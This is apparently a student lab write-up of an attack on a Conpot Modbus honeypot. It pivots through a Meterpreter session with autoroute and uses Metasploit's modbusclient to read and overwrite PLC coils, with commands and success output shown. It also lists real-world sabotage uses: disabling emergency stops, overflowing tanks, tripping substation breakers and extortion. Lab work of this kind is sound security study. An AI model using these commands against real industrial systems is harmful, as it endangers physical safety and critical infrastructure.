# ICS Honeypot Attack Lab: Modbus Exploitation via Conpot

This lab simulates a real-world ICS attack scenario by pivoting through a compromised Windows jump box and exploiting an industrial honeypot (Conpot) using Modbus protocol commands. The target runs on a segregated ICS subnet.

---

## Lab Setup

### Network Structure

```
Kali (Attacker)
   ↳ Meterpreter Session on Windows Jump Box (192.168.1.150)
       ↳ Pivot Route to ICS Subnet (10.0.0.0/24)
           ↳ Conpot Modbus Honeypot (10.0.0.200:5020)
```

### Tools Used

| Tool              | Purpose                       |
|------------------|-------------------------------|
| Kali Linux        | Attacker box                 |
| Metasploit        | Payloads, sessions, routing |
| Conpot            | ICS Honeypot (Modbus)        |
| Python + XML      | Template analysis            |

---

## Reconnaissance

### Target Identified via `ps aux`
Conpot is confirmed running on the honeypot with the Modbus template:

```bash
ps aux | grep conpot
```

### Modbus Template Location

```bash
find ~/conpot-env -name modbus.xml
```

Located at:
```
/home/username/conpot-env/lib/python3.8/site-packages/conpot/templates/default/modbus/modbus.xml
```

---

## Pivot: Route Through Meterpreter

```bash
meterpreter > run autoroute -s 10.0.0.0/24
```

> Adds a route from the jump box to the ICS subnet via `192.168.1.150`

---

## Exploitation with `modbusclient`

### 1. **Read Coil Values**

```bash
use auxiliary/scanner/scada/modbusclient
set RHOSTS 10.0.0.200
set RPORT 5020
set ACTION READ_COILS
run
```

> Successfully read coil address 1

---

### 2. **Write to a Coil**

```bash
set ACTION WRITE_COIL
set DATA_ADDRESS 1
set DATA 0
run
```

## Output:
```
10.0.0.200:5020 - Value 0 successfully written at coil address 1
```

---

## Sample Output

![Successful write coil](screenshots/Changed%20Coil%20Value%20in%20PLC.png)

---

## Analysis of `modbus.xml`

Extracted coil and register addresses from the honeypot XML:

```xml
<type>COILS</type>
<starting_address>1</starting_address>
<size>128</size>
```

---

## Summary

| Phase              | Result                   |
|-------------------|--------------------------|
| Initial Access     | Meterpreter session on Jump Box |
| Pivot              | `autoroute` to ICS subnet |
| Conpot Verification| Process running with Modbus |
| Read/Write Coils   | Successful via `modbusclient` |

---

## Ethical Notice

This lab is purely for educational and research purposes in a closed, controlled environment. No real systems were accessed.

---

# Key Takeways
This lab simulated a cyberattack on an ICS network in a controlled environment. The goal was to replicate a scenario where an attacker utilizes open source intelligence (OSINT) to perform reconnaisance, pivot into an isolated ICS network, and manipulate values that affect the functions of a PLC through the Modbus Protocol. 
The exploit used allowed me to read/write coils (or single-bit memory locations). These coils represent on/off states of digital outputs, such as switches, motors, or alarms. 1 = on, 0 = off. 

set ACTION WRITE_COIL 
set DATA_ADDRESS 1 
set DATA 0
run

This series of commands in the msfconsole exploit being used allowed me to write new data to the coil within memory address 1, changing it's status to 0, or off. This remotely disabled the device, and in the real world could have amounted to turning off a fan, pump, valve, circuit breaker, or sensor of any type. 

Modbus protocol offers no authentication/encryption, therefore any level of network access can send these commands. 

# real world examples with this exploit
## 1) Disabling Safety Systems
   set coil controlling emergency stop to off, preventing automatic shutoff in case of dangerous conditions

## 2) Overflowing Tanks
   Set coil value attributed to opening a valve to on permenantly, causing tanks to overflow, leading to flooding, contamination, or material shortages

## 3) Damaging Machinery
   Toggle coil controlling motor stop/start in rapid succession at a manufacturing plant, causing mechanical stress, overheating, or damage to motors. 

## 4) Blacking out substation
   Set coil to open a circuit breaker at power grid substation, cutting off power to an entire section of a grid. 

## 5) Halting production for ransom
   Disable key actuators such as robot arms, mixers, and presses to force downtime until ransom is paid

# Next Steps

- Simulate unauthorized sensor manipulation
- Add logging and alerting via Conpot
- Expand to protocols like S7, BACnet, or DNP3
